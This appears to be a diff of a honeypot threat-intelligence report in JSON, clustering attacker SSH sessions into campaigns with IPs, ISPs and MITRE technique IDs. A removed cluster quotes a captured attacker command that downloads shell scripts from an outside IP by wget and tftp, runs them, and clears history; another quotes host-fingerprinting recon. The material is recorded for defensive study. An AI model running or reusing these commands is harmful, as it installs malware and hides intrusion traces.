@@ -1,24 +1,11 @@
 {
-  "generated_at": "2026-07-05T13:48:36.386873+00:00",
-  "total_sessions_with_commands": 114,
-  "total_clusters": 8,
-  "campaign_clusters": 3,
-  "singleton_clusters": 3,
+  "generated_at": "2026-07-05T15:16:32.411399+00:00",
+  "total_sessions_with_commands": 90,
+  "total_clusters": 7,
+  "campaign_clusters": 2,
+  "singleton_clusters": 2,
   "highest_severity": "HIGH",
   "active_campaigns": [
-    {
-      "cluster_id": "CLU-001",
-      "name": "Recon Loader Script",
-      "severity": "MEDIUM",
-      "session_count": 68,
-      "unique_ip_count": 2,
-      "ttps": [
-        "T1082",
-        "T1592",
-        "T1078",
-        "T1083"
-      ]
-    },
     {
       "cluster_id": "CLU-002",
       "name": "Mirai/IoT Botnet",
@@ -32,11 +19,11 @@
       ]
     },
     {
-      "cluster_id": "CLU-003",
+      "cluster_id": "CLU-004",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 12,
-      "unique_ip_count": 12,
+      "session_count": 3,
+      "unique_ip_count": 3,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -49,616 +36,74 @@
   "clusters": [
     {
       "cluster_id": "CLU-001",
-      "is_campaign": true,
-      "campaign_name": "Recon Loader Script",
-      "campaign_severity": "MEDIUM",
-      "campaign_description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-      "matched_campaigns": [
-        {
-          "name": "Recon Loader Script",
-          "ttps": [
-            "T1078",
-            "T1083",
-            "T1592",
-            "T1082"
-          ],
-          "severity": "MEDIUM",
-          "description": "Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.",
-          "pattern_hits": 3,
-          "pattern_total": 6
-        },
-        {
-          "name": "Mirai/IoT Botnet",
-          "ttps": [
-            "T1105",
-            "T1059.004"
-          ],
-          "severity": "HIGH",
-          "description": "Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.",
-          "pattern_hits": 1,
-          "pattern_total": 3
-        }
-      ],
-      "session_count": 68,
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 6,
       "unique_ips": [
-        "195.178.110.228",
-        "91.92.40.6"
+        "14.33.48.192"
       ],
-      "unique_ip_count": 2,
-      "sequence_hash": "d2ac04915390abe8",
-      "ttps": [
-        {
-          "id": "T1082",
-          "name": "System Information Discovery"
-        },
-        {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
-        },
-        {
-          "id": "T1078",
-          "name": "T1078"
-        },
-        {
-          "id": "T1083",
-          "name": "T1083"
-        }
-      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "486c3a8fd7f1236c",
+      "ttps": [],
       "representative_commands": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una",
-        "uname -s -v -n -m 2 > /dev/null",
-        "/bin/uname -s -v -n -m 2 > /dev/null",
-        "/usr/bin/uname -s -v -n -m 2 > /dev/null",
-        "busybox uname -s -v -n -m 2 > /dev/null",
-        "( [ -f /proc/version ]",
-        "[ -f /proc/version ]",
-        "head -1 /proc/version | cut -d -f1",
-        "[ -f /etc/os-release ]"
+        "lghkel",
+        "zpz}ld",
+        "zalee",
+        "za",
+        "&k`g&k|zpkfq)ES[M",
+        "g & k | zpkfq"
       ],
       "members": [
         {
-          "session_id": "IR-8c964cb0770d",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T08:56:54.624470Z"
-        },
-        {
-          "session_id": "IR-5edc4f37bc64",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T08:58:04.250083Z"
-        },
-        {
-          "session_id": "IR-5fa67cbff9f6",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T08:59:33.845888Z"
-        },
-        {
-          "session_id": "IR-5596d7044358",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:01:05.786273Z"
-        },
-        {
-          "session_id": "IR-981898a5c8ff",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:02:34.769864Z"
-        },
-        {
-          "session_id": "IR-5c312e0037e7",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:05:31.060005Z"
-        },
-        {
-          "session_id": "IR-049b36ac6e84",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:06:58.715962Z"
-        },
-        {
-          "session_id": "IR-c5d709141857",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:08:26.404503Z"
-        },
-        {
-          "session_id": "IR-4f2b6daade4e",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:09:54.922912Z"
-        },
-        {
-          "session_id": "IR-2c0826b1d5a8",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:11:24.380928Z"
-        },
-        {
-          "session_id": "IR-5a96a2a86a83",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:12:52.417772Z"
-        },
-        {
-          "session_id": "IR-f2a203ae9241",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:14:22.469442Z"
-        },
-        {
-          "session_id": "IR-6278e6c9a2ea",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:15:53.609003Z"
-        },
-        {
-          "session_id": "IR-177c5f75db75",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:17:23.418206Z"
-        },
-        {
-          "session_id": "IR-bfd663468833",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:18:55.031460Z"
-        },
-        {
-          "session_id": "IR-ef328dc680f1",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:20:24.914456Z"
-        },
-        {
-          "session_id": "IR-25775d44d82a",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:21:51.308327Z"
-        },
-        {
-          "session_id": "IR-866fc13a8f23",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:23:17.924122Z"
-        },
-        {
-          "session_id": "IR-b50ce000d618",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:24:45.839543Z"
-        },
-        {
-          "session_id": "IR-3a8c1a667dbc",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:26:14.075440Z"
-        },
-        {
-          "session_id": "IR-e3946c709d81",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:27:41.186227Z"
-        },
-        {
-          "session_id": "IR-b5a7473e54ef",
-          "src_ip": "91.92.40.6",
-          "country": "NL",
-          "isp": "TechTies Inc.",
-          "command_count": 9,
-          "timestamp": "2026-07-05T09:29:09.411284Z"
-        },
-        {
-          "session_id": "IR-9491b917a3d0",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:42:39.234226Z"
-        },
-        {
-          "session_id": "IR-a305597a9278",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:44:18.602217Z"
-        },
-        {
-          "session_id": "IR-a1ce2c8593a9",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:46:07.885496Z"
-        },
-        {
-          "session_id": "IR-3a9b73523688",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:47:53.629684Z"
-        },
-        {
-          "session_id": "IR-63d1b60491b0",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:49:38.111629Z"
-        },
-        {
-          "session_id": "IR-d2249061e6bf",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:52:48.960067Z"
-        },
-        {
-          "session_id": "IR-0b4708c5e72d",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:54:23.140446Z"
-        },
-        {
-          "session_id": "IR-793c0b199dd2",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:55:50.301112Z"
-        },
-        {
-          "session_id": "IR-7920de6f8a41",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:57:14.832834Z"
-        },
-        {
-          "session_id": "IR-e8fb98ff5831",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T10:58:40.950106Z"
-        },
-        {
-          "session_id": "IR-c85dc585c5ac",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:00:14.435786Z"
-        },
-        {
-          "session_id": "IR-d03fe857f723",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:01:53.154786Z"
-        },
-        {
-          "session_id": "IR-e42705457655",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:03:28.390792Z"
-        },
-        {
-          "session_id": "IR-f812a7a325ec",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:05:01.192779Z"
-        },
-        {
-          "session_id": "IR-fe5bcaf51116",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:06:32.965723Z"
-        },
-        {
-          "session_id": "IR-5cc88b311e83",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:08:13.840416Z"
-        },
-        {
-          "session_id": "IR-4b4977bf4c5c",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:09:50.323808Z"
-        },
-        {
-          "session_id": "IR-5b95f2c13144",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:11:18.260790Z"
-        },
-        {
-          "session_id": "IR-d0f987f55c97",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:12:48.975766Z"
-        },
-        {
-          "session_id": "IR-690d73cae9a4",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:14:18.598254Z"
-        },
-        {
-          "session_id": "IR-58a3a3ef426c",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:17:08.489175Z"
-        },
-        {
-          "session_id": "IR-78298f597bab",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:18:35.158465Z"
-        },
-        {
-          "session_id": "IR-235ec5d76642",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:20:03.496295Z"
-        },
-        {
-          "session_id": "IR-91daa297950c",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:21:38.890622Z"
-        },
-        {
-          "session_id": "IR-f91f86e4a4b0",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:23:10.985445Z"
-        },
-        {
-          "session_id": "IR-4937975986a8",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:24:39.900391Z"
-        },
-        {
-          "session_id": "IR-fd5ecd6971d4",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:26:14.324467Z"
-        },
-        {
-          "session_id": "IR-53e194109329",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:27:48.066925Z"
-        },
-        {
-          "session_id": "IR-61f7411b6e14",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:29:17.257650Z"
-        },
-        {
-          "session_id": "IR-6faaa9070e02",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:30:46.977941Z"
-        },
-        {
-          "session_id": "IR-4d53c25531a3",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:32:11.455518Z"
-        },
-        {
-          "session_id": "IR-81e1cf28a4bd",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:33:41.174835Z"
-        },
-        {
-          "session_id": "IR-4f9c096a7899",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:35:09.584789Z"
-        },
-        {
-          "session_id": "IR-3b9ab535260a",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:36:38.277035Z"
-        },
-        {
-          "session_id": "IR-7401e036dd7f",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:38:05.000805Z"
-        },
-        {
-          "session_id": "IR-a71a8835f1f4",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:39:32.239876Z"
-        },
-        {
-          "session_id": "IR-6ffd7a9eca75",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:41:00.725563Z"
-        },
-        {
-          "session_id": "IR-30b0a459b3b3",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:42:30.590597Z"
-        },
-        {
-          "session_id": "IR-e5a1ee86b99e",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:44:02.079908Z"
-        },
-        {
-          "session_id": "IR-62a1e097abe8",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:45:34.488459Z"
-        },
-        {
-          "session_id": "IR-07ba398adab6",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:47:05.077446Z"
-        },
-        {
-          "session_id": "IR-70600c52527d",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:48:34.972269Z"
-        },
-        {
-          "session_id": "IR-0486d6061d8b",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:50:03.514853Z"
-        },
-        {
-          "session_id": "IR-73e24d345c04",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:51:28.418024Z"
-        },
-        {
-          "session_id": "IR-018888373e2e",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:52:52.179823Z"
-        },
-        {
-          "session_id": "IR-a098a04d7b06",
-          "src_ip": "195.178.110.228",
-          "country": "NL",
-          "isp": "TECHOFF SRV LIMITED",
-          "command_count": 9,
-          "timestamp": "2026-07-05T11:54:15.890064Z"
+          "session_id": "IR-a77391714776",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 6,
+          "timestamp": "2026-07-05T14:32:58.503146Z"
+        },
+        {
+          "session_id": "IR-934157a1f8f5",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 6,
+          "timestamp": "2026-07-05T14:33:32.699747Z"
+        },
+        {
+          "session_id": "IR-267c8cea2bef",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 6,
+          "timestamp": "2026-07-05T14:34:06.707126Z"
+        },
+        {
+          "session_id": "IR-017bf9d0d2fc",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 6,
+          "timestamp": "2026-07-05T14:36:23.722489Z"
+        },
+        {
+          "session_id": "IR-5e04b18a02e0",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 6,
+          "timestamp": "2026-07-05T14:36:57.709196Z"
+        },
+        {
+          "session_id": "IR-9b8bcd625c3b",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 6,
+          "timestamp": "2026-07-05T14:38:05.738756Z"
         }
       ]
     },
@@ -683,7 +128,7 @@
       ],
       "session_count": 1,
       "unique_ips": [
-        "141.11.88.137"
+        "91.92.40.90"
       ],
       "unique_ip_count": 1,
       "sequence_hash": "247e5eacc7fee14d",
@@ -709,17 +154,72 @@
       ],
       "members": [
         {
-          "session_id": "IR-b4c5e1917c3b",
-          "src_ip": "141.11.88.137",
-          "country": "US",
-          "isp": "Vantiva SA",
+          "session_id": "IR-9e11c2631c11",
+          "src_ip": "91.92.40.90",
+          "country": "NL",
+          "isp": "TechTies Inc.",
           "command_count": 4,
-          "timestamp": "2026-07-05T11:34:42.206793Z"
+          "timestamp": "2026-07-05T13:43:34.862122Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-003",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 4,
+      "unique_ips": [
+        "14.33.48.192"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "e8182948ac6f4b19",
+      "ttps": [],
+      "representative_commands": [
+        "zalee",
+        "za",
+        "&k`g&k|zpkfq)ES[M",
+        "g & k | zpkfq"
+      ],
+      "members": [
+        {
+          "session_id": "IR-23f09d809dc2",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 4,
+          "timestamp": "2026-07-05T14:34:40.712669Z"
+        },
+        {
+          "session_id": "IR-a7865a5be227",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 4,
+          "timestamp": "2026-07-05T14:35:14.711419Z"
+        },
+        {
+          "session_id": "IR-cd7a9c7bc200",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 4,
+          "timestamp": "2026-07-05T14:35:49.699418Z"
+        },
+        {
+          "session_id": "IR-3e67934d077d",
+          "src_ip": "14.33.48.192",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 4,
+          "timestamp": "2026-07-05T14:37:31.715583Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -738,22 +238,13 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 12,
+      "session_count": 3,
       "unique_ips": [
-        "103.69.96.120",
-        "51.75.141.245",
-        "175.119.225.68",
-        "211.251.245.88",
-        "189.204.230.91",
-        "197.225.146.23",
-        "209.99.190.200",
-        "217.60.3.128",
-        "181.0.214.136",
-        "175.103.54.172",
-        "129.121.42.131",
-        "103.20.122.54"
+        "108.174.156.122",
+        "69.5.0.120",
+        "201.17.133.138"
       ],
-      "unique_ip_count": 12,
+      "unique_ip_count": 3,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -783,158 +274,28 @@
       ],
       "members": [
         {
-          "session_id": "IR-9f61a0559908",
-          "src_ip": "197.225.146.23",
-          "country": "MU",
-          "isp": "MauritiusTelecom",
+          "session_id": "IR-c36fe1a31de2",
+          "src_ip": "108.174.156.122",
+          "country": "CO",
+          "isp": "HostGator.com LLC",
           "command_count": 2,
-          "timestamp": "2026-07-05T11:00:41.732819Z"
+          "timestamp": "2026-07-05T14:18:30.725294Z"
         },
         {
-          "session_id": "IR-207f261fa3d7",
-          "src_ip": "217.60.3.128",
-          "country": "LV",
-          "isp": "CGI GLOBAL LIMITED",
-          "command_count": 2,
-          "timestamp": "2026-07-05T11:03:39.491279Z"
-        },
-        {
-          "session_id": "IR-de71ebbb052d",
-          "src_ip": "211.251.245.88",
-          "country": "KR",
-          "isp": "Korea Telecom",
-          "command_count": 2,
-          "timestamp": "2026-07-05T11:50:10.022874Z"
-        },
-        {
-          "session_id": "IR-685421a62c33",
-          "src_ip": "189.204.230.91",
-          "country": "MX",
-          "isp": "Operbes, S.A. de C.V.",
-          "command_count": 2,
-          "timestamp": "2026-07-05T11:51:15.332698Z"
-        },
-        {
-          "session_id": "IR-51308ff0f835",
-          "src_ip": "181.0.214.136",
-          "country": "AR",
-          "isp": "Telecom Argentina S.A.",
-          "command_count": 2,
-          "timestamp": "2026-07-05T11:57:25.536821Z"
-        },
-        {
-          "session_id": "IR-d0478b4d9127",
-          "src_ip": "175.119.225.68",
-          "country": "KR",
-          "isp": "SK Broadband Co Ltd",
-          "command_count": 2,
-          "timestamp": "2026-07-05T11:58:53.276758Z"
-        },
-        {
-          "session_id": "IR-766a45d9a31e",
-          "src_ip": "175.103.54.172",
+          "session_id": "IR-830d4180bae8",
+          "src_ip": "69.5.0.120",
           "country": "ID",
-          "isp": "Maxindo Content Solution, PT",
+          "isp": "BYTEPLUS",
           "command_count": 2,
-          "timestamp": "2026-07-05T12:02:29.801756Z"
+          "timestamp": "2026-07-05T14:20:17.804099Z"
         },
         {
-          "session_id": "IR-fb8a44a74c35",
-          "src_ip": "209.99.190.200",
-          "country": "CH",
-          "isp": "SKN Subnet & Telecom Ltd",
-          "command_count": 2,
-          "timestamp": "2026-07-05T12:04:30.097725Z"
-        },
-        {
-          "session_id": "IR-3998198f45c3",
-          "src_ip": "129.121.42.131",
+          "session_id": "IR-741fd1801779",
+          "src_ip": "201.17.133.138",
           "country": "BR",
-          "isp": "Oso Grande IP Services, LLC",
+          "isp": "Claro NXT Telecomunicacoes Ltda",
           "command_count": 2,
-          "timestamp": "2026-07-05T12:07:12.205502Z"
-        },
-        {
-          "session_id": "IR-7b9738e4b19e",
-          "src_ip": "103.69.96.120",
-          "country": "VN",
-          "isp": "VN CLOUD ONE MEMBER COMPANY LIMITED",
-          "command_count": 2,
-          "timestamp": "2026-07-05T12:41:25.670151Z"
-        },
-        {
-          "session_id": "IR-880daa1cec34",
-          "src_ip": "103.20.122.54",
-          "country": "SG",
-          "isp": "AEC.CLOUD",
-          "command_count": 2,
-          "timestamp": "2026-07-05T12:42:14.394811Z"
-        },
-        {
-          "session_id": "IR-b2cf27ae3b63",
-          "src_ip": "51.75.141.245",
-          "country": "FR",
-          "isp": "OVH SAS",
-          "command_count": 2,
-          "timestamp": "2026-07-05T12:43:02.942322Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-004",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 3,
-      "unique_ips": [
-        "83.168.69.141"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d0caa477f2c2a3ed",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        },
-        {
-          "id": "T1070",
-          "name": "Indicator Removal"
-        },
-        {
-          "id": "T1140",
-          "name": "Deobfuscate/Decode Files"
-        }
-      ],
-      "representative_commands": [
-        "sh",
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.168.110.191/re.sh; chmod 777 *; sh re.sh; tftp -g 83.168.110.191 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"
-      ],
-      "members": [
-        {
-          "session_id": "IR-1fdd12e80e40",
-          "src_ip": "83.168.69.141",
-          "country": "PL",
-          "isp": "Virtual Private Server",
-          "command_count": 2,
-          "timestamp": "2026-07-05T11:13:04.477579Z"
-        },
-        {
-          "session_id": "IR-3a29d1c27d0d",
-          "src_ip": "83.168.69.141",
-          "country": "PL",
-          "isp": "Virtual Private Server",
-          "command_count": 2,
-          "timestamp": "2026-07-05T11:13:54.821128Z"
-        },
-        {
-          "session_id": "IR-9e58036488fd",
-          "src_ip": "83.168.69.141",
-          "country": "PL",
-          "isp": "Virtual Private Server",
-          "command_count": 2,
-          "timestamp": "2026-07-05T11:14:47.469872Z"
+          "timestamp": "2026-07-05T14:22:47.378185Z"
         }
       ]
     },
@@ -945,7 +306,7 @@
       "campaign_severity": null,
       "campaign_description": null,
       "matched_campaigns": [],
-      "session_count": 26,
+      "session_count": 14,
       "unique_ips": [
         "45.198.224.120",
         "185.242.3.195"
@@ -958,212 +319,116 @@
       ],
       "members": [
         {
-          "session_id": "IR-f71b7040241f",
+          "session_id": "IR-826967436017",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-05T09:00:30.155397Z"
+          "timestamp": "2026-07-05T12:57:24.836163Z"
         },
         {
-          "session_id": "IR-f564938b5010",
+          "session_id": "IR-f7d9db60d461",
           "src_ip": "45.198.224.120",
           "country": "NL",
           "isp": "VPSVAULT.HOST LTD",
           "command_count": 1,
-          "timestamp": "2026-07-05T09:11:40.611897Z"
+          "timestamp": "2026-07-05T13:08:39.000454Z"
         },
         {
-          "session_id": "IR-9fa49353638f",
